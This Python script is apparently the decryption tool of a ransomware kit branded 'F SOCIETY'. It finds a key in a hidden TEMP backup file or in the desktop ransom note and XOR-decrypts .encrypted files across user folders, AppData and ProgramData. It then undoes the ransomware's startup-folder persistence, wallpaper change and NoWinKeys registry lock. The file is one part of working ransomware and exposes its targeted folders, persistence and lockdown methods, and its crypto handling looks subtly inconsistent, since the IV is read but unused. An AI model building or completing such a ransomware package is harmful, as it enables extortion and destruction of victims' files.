import os
import base64
import ctypes
import subprocess
import sys
import re
import winreg

# --- Configuration ---
DECRYPT_KEY = "agent77"

# --- Decryption Functions ---
def decrypt_file(file_path, key, iv):
    try:
        with open(file_path, 'rb') as f:
            iv_data = f.read(16)
            encrypted_data = f.read()
        xor_key = key[:16]
        decrypted_data = bytes([encrypted_data[i] ^ xor_key[i % len(xor_key)] for i in range(len(encrypted_data))])
        original_path = file_path.replace('.encrypted', '')
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        os.remove(file_path)
        return True
    except:
        return False

def decrypt_all_files(key, iv):
    count = 0
    for directory in get_target_directories():
        for root, _, files in os.walk(directory):
            for file in files:
                if file.endswith('.encrypted'):
                    file_path = os.path.join(root, file)
                    if decrypt_file(file_path, key, iv):
                        count += 1
    return count

def get_target_directories():
    user_profile = os.environ.get('USERPROFILE', 'C:\\Users\\Default')
    paths = [
        user_profile + '\\Desktop',
        user_profile + '\\Documents',
        user_profile + '\\Downloads',
        user_profile + '\\Pictures',
        user_profile + '\\Music',
        user_profile + '\\Videos',
        user_profile + '\\AppData\\Local',
        user_profile + '\\AppData\\Roaming',
        user_profile + '\\Favorites',
        user_profile + '\\OneDrive',
        'C:\\ProgramData',
        'C:\\Users\\Public\\Documents',
        'C:\\Users\\Public\\Desktop'
    ]
    return [p for p in paths if os.path.exists(p)]

def unlock_windows_key():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "NoWinKeys", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(handle)
    except:
        pass

def restore_wallpaper():
    try:
        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 3)
    except:
        pass

def remove_startup():
    try:
        startup = os.environ.get('APPDATA', '') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        if os.path.exists(startup + '\\fsociety_ransomware.exe'):
            os.remove(startup + '\\fsociety_ransomware.exe')
    except:
        pass

def main():
    print("=" * 60)
    print("F SOCIETY DECRYPTION TOOL")
    print("=" * 60)
    print("\n[+] Enter decryption key:")
    key_input = input("> ").strip()
    
    if key_input != DECRYPT_KEY:
        print("[-] Invalid key!")
        input("\nPress Enter to exit...")
        sys.exit(1)
    
    print("\n[+] Key accepted. Locating encryption key...")
    
    try:
        # Try hidden backup file
        hidden = os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key'
        if os.path.exists(hidden):
            print("[+] Found backup key file.")
            with open(hidden, 'r') as f:
                lines = f.readlines()
                if len(lines) >= 3 and lines[2].strip() == DECRYPT_KEY:
                    key = base64.b64decode(lines[0].strip())
                    iv = base64.b64decode(lines[1].strip())
                    print("[+] Starting decryption...")
                    count = decrypt_all_files(key, iv)
                    print(f"[+] Decrypted {count} files!")
                    
                    # Cleanup
                    try: os.remove(hidden)
                    except: pass
                    try: os.remove(os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop\\README_FSOCIETY.txt')
                    except: pass
                    restore_wallpaper()
                    unlock_windows_key()
                    remove_startup()
                    
                    print("\n[+] All files restored!")
                    input("\nPress Enter to exit...")
                    sys.exit(0)
        
        # Try ransom note
        note = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop\\README_FSOCIETY.txt'
        if os.path.exists(note):
            print("[+] Found ransom note.")
            with open(note, 'r') as f:
                content = f.read()
                km = re.search(r'Key: (\S+)', content)
                im = re.search(r'IV: (\S+)', content)
                if km and im:
                    key = base64.b64decode(km.group(1))
                    iv = base64.b64decode(im.group(1))
                    print("[+] Starting decryption...")
                    count = decrypt_all_files(key, iv)
                    print(f"[+] Decrypted {count} files!")
                    
                    # Cleanup
                    try: os.remove(note)
                    except: pass
                    restore_wallpaper()
                    unlock_windows_key()
                    remove_startup()
                    
                    print("\n[+] All files restored!")
                    input("\nPress Enter to exit...")
                    sys.exit(0)
        
        print("[-] Could not find encryption key.")
        print("[-] Decryption failed.")
        
    except Exception as e:
        print(f"[-] Error: {str(e)}")
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()
